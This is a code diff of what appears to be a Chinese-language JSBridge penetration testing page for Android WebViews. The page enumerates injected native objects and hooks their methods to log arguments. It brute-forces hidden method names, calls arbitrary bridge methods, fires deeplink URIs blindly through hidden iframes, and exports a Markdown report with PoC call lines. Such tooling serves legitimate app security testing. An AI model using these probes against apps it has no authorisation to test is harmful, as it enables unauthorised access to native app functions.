+        globalScanData.forEach((item) => {
+            sel.innerHTML += `<option value="${item.name}">window.${item.name}</option>`;
+            
+            const div = document.createElement('div');
+            div.className = 'list-item';
+            div.innerHTML = `
+                <div style="display:flex; justify-content:space-between; align-items:center;">
+                    <span style="font-family:monospace;font-weight:bold;color:var(--blue)">.${item.name}</span>
+                    <span class="risk-tag ${item.maxRisk}">${item.info.cat}</span>
+                </div>
+                <div style="font-size:0.8em;color:var(--text-dim);margin-top:4px;">枚举出子方法: ${item.methods.length} 个</div>
+            `;
+            div.onclick = () => renderTreeView(item, div);
+            listDiv.appendChild(div);
+        });
+    }
 
-        // 漏洞案例库
-        if (matchedVulnIds.size > 0) {
-            const casePanel = document.getElementById("matched-cases-panel");
-            casePanel.style.display = "block";
-            let caseHtml = "";
-            matchedVulnIds.forEach(id => {
-                const v = VULN_KNOWLEDGE[id];
-                caseHtml += `<div class="case-item">
-                    <strong style="color:var(--red);font-size:1.1em;">[${id}] ${v.category}</strong> - ${v.desc}
-                    <div class="case-poc">${v.poc.replace(/\[Bridge\]/g, "<span style='color:var(--orange)'>目标对象名</span>")}</div>
+    function renderTreeView(item, domElement) {
+        document.querySelectorAll('.list-item').forEach(el => el.classList.remove('active'));
+        if(domElement) domElement.classList.add('active');
+
+        const container = document.getElementById('tree-container');
+        let html = `<h3 style="color:var(--orange);margin-bottom:10px;border-bottom:1px solid var(--border);padding-bottom:5px;">window.${item.name} <span style="font-size:0.7em;color:var(--text-dim)">[${item.type}]</span></h3>`;
+        
+        if(item.methods.length === 0) {
+            html += `<p style="color:var(--text-dim);line-height:1.6;">⚠️ 此原生对象当前未暴露出任何可被探测的属性。<br>如果确认为 Java 注入的 Bridge，它的方法极有可能被混淆或通过 @JavascriptInterface 保护。<br>👉 <strong style="color:var(--red)">建议在左侧下拉框选中它，使用字典爆破进行强行撞库。</strong></p>`;
+        } else {
+            item.methods.forEach(m => {
+                html += `
+                <div class="tree-node">
+                    <div class="tree-header">
+                        <span class="tree-key">.${m.name}()</span>
+                        <span class="tree-val">[${m.type}]</span>
+                        ${m.info.r !== 'r-none' ? `<span class="risk-tag ${m.info.r}">${m.info.cat}</span>` : ''}
+                        <button class="action-btn" onclick="document.getElementById('exec-path').value='window.${item.name}.${m.name}'; log('已装载调用路径: window.${item.name}.${m.name}', 'warn');">装载至终端</button>
+                    </div>
                 </div>`;
             });
-            document.getElementById("case-list").innerHTML = caseHtml;
         }
-
-        renderList();
-        
-        // 搜索框绑定
-        document.getElementById('search').addEventListener('input', renderList);
+        container.innerHTML = html;
+        document.getElementById('exec-path').value = `window.${item.name}`;
     }
 
+    // ==============================================================================
+    // 在纯净扫描完成之后，最后才把需要绑定给 HTML onclick 的工具方法挂载到 window
+    // 这样它们绝对不会出现在 PURE_INJECTED_KEYS 里面！
+    // ==============================================================================
 
-    // --- 5. 挂载全局方法 (仅给 HTML 绑定的 onclick 使用，此时环境差异快照早已完成) ---
-    window.tryCall = function(path) {
-        const parts = path.split('.');
-        let target = window;
-        let parent = null;
+    runAnalysis(); // 同步执行纯净的数据解析和渲染
+
+    // 1. AOP 拦截器 (Hooking)
+    window.toggleGlobalHook = function() {
+        const btn = document.getElementById('btn-hook');
+        if(isHooked) {
+            log('全局 Hook 已就绪，如需卸载请强制刷新页面。', 'warn');
+            return;
+        }
+        
+        let hookCount = 0;
+        globalScanData.forEach(objData => {
+            const target = window[objData.name];
+            if(typeof target === 'object' && target !== null) {
+                objData.methods.forEach(m => {
+                    if(m.type === 'function' && !target[m.name].__hooked) {
+                        const original = target[m.name];
+                        target[m.name] = function(...args) {
+                            const argStr = args.map(a => { try { return JSON.stringify(a); } catch(e){ return String(a); } }).join(', ');
+                            log(`[AOP 拦截] 捕获到底层调用: <b>${objData.name}.${m.name}</b>(${argStr})`, 'hook');
+                            return original.apply(this, args);
+                        };
+                        target[m.name].__hooked = true;
+                        hookCount++;
+                    }
+                });
+            }
+        });
+        
+        window.addEventListener("message", e => {
+            log(`[Window Msg] 捕获到原生异步推送: ${typeof e.data === 'object' ? JSON.stringify(e.data) : e.data}`, 'hook');
+        });
+
+        isHooked = true;
+        btn.innerText = "🛑 AOP Hook 运行中 (刷新解除)";
+        btn.classList.replace('primary', 'danger');
+        log(`AOP 切面部署完毕，成功接管了 ${hookCount} 个原生函数的入参监听。`, 'info');
+    };
+
+    // 2. 隐蔽字典爆破 (Brute Force)
+    window.startBruteForce = function() {
+        const targetName = document.getElementById('brute-target').value;
+        if(!targetName) { log('撞库中止：请先从下拉框选择一个目标对象。', 'err'); return; }
+        
+        const targetObj = window[targetName];
+        const progDiv = document.getElementById('brute-progress');
+        const btn = document.getElementById('btn-brute');
+        
+        btn.disabled = true;
+        let idx = 0; let foundCount = 0;
+        log(`💀 发起强力字典撞库: 目标 [window.${targetName}]...`, 'warn');
+
+        let scanItem = globalScanData.find(i => i.name === targetName);
+        if(!scanItem) return;
+
+        function step() {
+            if(idx >= BRUTE_DICT.length) {
+                btn.disabled = false;
+                progDiv.innerText = `探测完毕！共撞击 ${BRUTE_DICT.length} 次，逼出 ${foundCount} 个隐藏方法。`;
+                log(`🏁 撞库结束。请在中间的树状图面板查看新挖掘出的隐藏接口。`, 'info');
+                if(document.getElementById('exec-path').value.includes(targetName)) renderTreeView(scanItem);
+                return;
+            }
+
+            const testMethod = BRUTE_DICT[idx];
+            progDiv.innerText = `探测中: .${testMethod}() [${idx+1}/${BRUTE_DICT.length}]`;
+
+            try {
+                if(targetObj[testMethod] !== undefined && !scanItem.methods.some(m => m.name === testMethod)) {
+                    foundCount++;
+                    const mInfo = evalRisk(testMethod);
+                    scanItem.methods.push({ name: testMethod + " [隐蔽被爆破]", type: "function", info: mInfo });
+                    log(`🎯 撞库成功: 发现隐藏的底层 API 漏洞点 => .${testMethod}()`, 'hook');
+                }
+            } catch(e) {
+                // Android 容器的安全策略经常会导致未经允许的属性读取抛错，这也侧面证明了它的存在
+                if(!scanItem.methods.some(m => m.name === testMethod)) {
+                    foundCount++;
+                    const mInfo = evalRisk(testMethod);
+                    scanItem.methods.push({ name: testMethod + " [越权受保护]", type: "function", info: mInfo });
+                    log(`🎯 撞库成功(边界探测): .${testMethod}() 存在，但因权限原因被容器保护。`, 'warn');
+                }
+            }
+
+            idx++;
+            setTimeout(step, 10);
+        }
+        step();
+    };
+
+    // 3. 执行调用与 Scheme 盲发
+    window.executeCommand = function() {
+        const path = document.getElementById('exec-path').value.replace("window.", "");
+        const paramsRaw = document.getElementById('exec-params').value;
+        if(!path) return;
+
+        log(`> 主动调用: ${path}( ${paramsRaw} )`);
         try {
-            parts.forEach(p => { parent = target; target = target[p]; });
-            if (typeof target === 'function') {
-                const res = target.call(parent);
-                showToast(`✅ 执行成功: ${res !== undefined ? JSON.stringify(res).substring(0,60) : '无返回值 (undefined)'}`);
+            let target = window; let parent = null;
+            path.split('.').forEach(p => { parent = target; target = target[p.replace(" [隐蔽被爆破]", "").replace(" [越权受保护]", "")]; });
+            
+            if(typeof target === 'function') {
+                let args = [];
+                if(paramsRaw) {
+                    try { args = [JSON.parse(paramsRaw)]; } catch(e) { args = [paramsRaw]; }
+                }
+                const res = target.apply(parent, args);
+                log(`<- 返回值: ${res !== undefined ? JSON.stringify(res) : 'undefined'}`, 'info');
             } else {
-                showToast(`ℹ️ 属性类型: ${typeof target}, 当前值: ${String(target).substring(0,50)}`);
+                log(`<- 该节点为属性变量，当前值: ${JSON.stringify(target)}`, 'info');
             }
         } catch(e) {
-            showToast(`❌ 执行异常: ${e.message}`);
+            log(`! 执行被阻断: ${e.message}`, 'err');
         }
     };
 
-    window.fireDeeplink = function() {
-        const url = document.getElementById('bridge-url').value;
-        if(!url) return;
-        const iframe = document.createElement("iframe");
-        iframe.style.display = "none";
-        iframe.src = url;
-        document.body.appendChild(iframe);
-        setTimeout(() => document.body.removeChild(iframe), 2000);
-        showToast(`🔗 探测 Payload 已触发: ${url}`);
-    };
-    
-    window.setBridge = function(val) { document.getElementById('bridge-url').value = val; };
+    window.testDeeplink = function() {
+        let url = document.getElementById('exec-params').value.trim() || document.getElementById('exec-path').value.trim();
+        if(!url.includes("://")) {
+            log("! 格式错误：盲发 Deeplink 必须是完整的 URI (如 intent://xxx 或 custom://xxx)", "err");
+            return;
+        }
+        log(`> 盲发协议探测: ${url}`);
+        
+        const cbName = "_dlcb_" + Date.now();
+        window[cbName] = function(res) { log(`🔥 Native 协议回调 [${cbName}]: ${JSON.stringify(res)}`, "hook"); };
+        let finalUrl = url.includes("?") ? `${url}&callback=${cbName}` : `${url}?callback=${cbName}`;
 
-    window.exportReport = function() {
+        const iframe = document.createElement("iframe");
+        iframe.style.display = "none"; 
+        iframe.src = finalUrl;
+        document.body.appendChild(iframe);
+        setTimeout(() => iframe.parentNode.removeChild(iframe), 2000);
+        log(`<- Payload 已经投递，请观察 App 表现或上述的被动 Terminal 监控日志。`, 'warn');
+    };
+
+    // 4. Markdown 报告导出
+    window.exportMarkdown = function() {
         let md = `# JSBridge 安全渗透测试报告\n\n`;
         md += `> **扫描时间:** ${new Date().toLocaleString()}\n`;
         md += `> **目标页面:** \`${location.href}\`\n`;
         md += `> **User-Agent:** \`${navigator.userAgent}\`\n\n`;
 
-        md += `## 1. 风险暴露面统计\n`;
-        md += `- **严重 (Critical):** ${stats.critical}\n- **高危 (High):** ${stats.high}\n- **中危 (Medium):** ${stats.medium}\n- **安全/未知 (Low):** ${stats.low}\n- **总计注入原生对象:** ${stats.total}\n\n`;
-
-        if (matchedVulnIds.size > 0) {
-            md += `## 2. 匹配的高危漏洞与 PoC\n`;
-            matchedVulnIds.forEach(id => {
-                const v = VULN_KNOWLEDGE[id];
-                md += `### [${v.severity.toUpperCase()}] ${id} - ${v.category}\n`;
-                md += `> ${v.desc}\n\n**利用载荷 (PoC):**\n\`\`\`javascript\n${v.poc}\n\`\`\`\n\n`;
+        let crit=0, high=0, med=0, low=0;
+        globalScanData.forEach(obj => {
+            obj.methods.forEach(m => {
+                if(m.info.r === 'r-crit') crit++;
+                else if(m.info.r === 'r-high') high++;
+                else if(m.info.r === 'r-med') med++;
+                else low++;
             });
-        }
+        });
+
+        md += `## 1. 风险暴露面统计\n`;
+        md += `- **严重 (Critical):** ${crit}\n- **高危 (High):** ${high}\n- **中危 (Medium):** ${med}\n- **安全/未知 (Low):** ${low}\n- **总计注入原生对象:** ${globalScanData.length}\n\n`;
+
+        md += `## 2. 匹配的高危漏洞与 PoC\n`;
+        let hasVuln = false;
+        globalScanData.forEach(obj => {
+            obj.methods.forEach(m => {
+                if(m.info.r === 'r-crit' || m.info.r === 'r-high') {
+                    hasVuln = true;
+                    md += `### [${m.info.r === 'r-crit' ? 'CRITICAL' : 'HIGH'}] ${m.info.cat} - 漏洞预警\n`;
+                    md += `> 描述: ${m.info.desc}\n\n**利用载荷示例 (PoC):**\n\`\`\`javascript\nwindow.${obj.name}.${m.name.replace(/ \[.*?\]/g, "")}();\n\`\`\`\n\n`;
+                }
+            });
+        });
+        if(!hasVuln) md += `*本次自动化扫描暂未发现直接匹配的严重风险规则。*\n\n`;
 
         md += `## 3. 注入接口详细清单\n`;
-        if(scanResults.length === 0) md += `*未检测到任何可疑接口注入。*\n`;
-        scanResults.forEach(item => {
-            md += `\n### \`window.${item.name}\` [${item.severity.toUpperCase()}]\n`;
-            md += `- **业务分类:** ${item.eval.category}\n`;
-            if (item.methods.length > 0) {
+        globalScanData.forEach(obj => {
+            md += `\n### \`window.${obj.name}\`\n`;
+            md += `- **业务分类:** ${obj.info.cat}\n`;
+            if(obj.methods.length > 0) {
                 md += `- **暴露的方法/属性:**\n`;
-                item.methods.forEach(m => {
-                    md += `  - \`.${m.name}()\` ${m.eval.id ? `**(🚨风险: ${m.eval.category})**` : ''}\n`;
+                obj.methods.forEach(m => {
+                    const riskTag = m.info.r !== 'r-none' && m.info.r !== 'r-low' ? ` **(🚨风险: ${m.info.cat})**` : '';
+                    md += `  - \`.${m.name}()\`${riskTag}\n`;
                 });
             } else {
-                md += `- *(未扫描到暴露的子属性)*\n`;
+                md += `- *(未扫描到暴露的子属性，已被系统标记，可能需使用字典爆破探测)*\n`;
             }
         });
 
-        document.getElementById('modal-title').innerText = "📄 渗透报告预览 (Markdown格式)";
-        document.getElementById('modal-body').innerText = md;
-        document.getElementById('modal').classList.add('show');
+        document.getElementById('report-body').innerText = md;
+        document.getElementById('report-modal').style.display = 'flex';
     };
 
-    window.copyModal = function() {
-        const text = document.getElementById("modal-body").innerText;
-        navigator.clipboard.writeText(text).then(() => showToast("✅ 报告已复制到剪贴板！"));
+    window.copyReport = function() {
+        const text = document.getElementById('report-body').innerText;
+        navigator.clipboard.writeText(text).then(() => {
+            log('报告 Markdown 代码已复制到剪贴板。', 'info');
+            document.getElementById('report-modal').style.display = 'none';
+        });
     };
-
-    window.toggleTheme = function() {
-        const html = document.documentElement;
-        html.setAttribute("data-theme", html.getAttribute("data-theme") === "light" ? "dark" : "light");
-    };
-
-    // 初始化运行
-    initUI();
 
 })();
 </script>
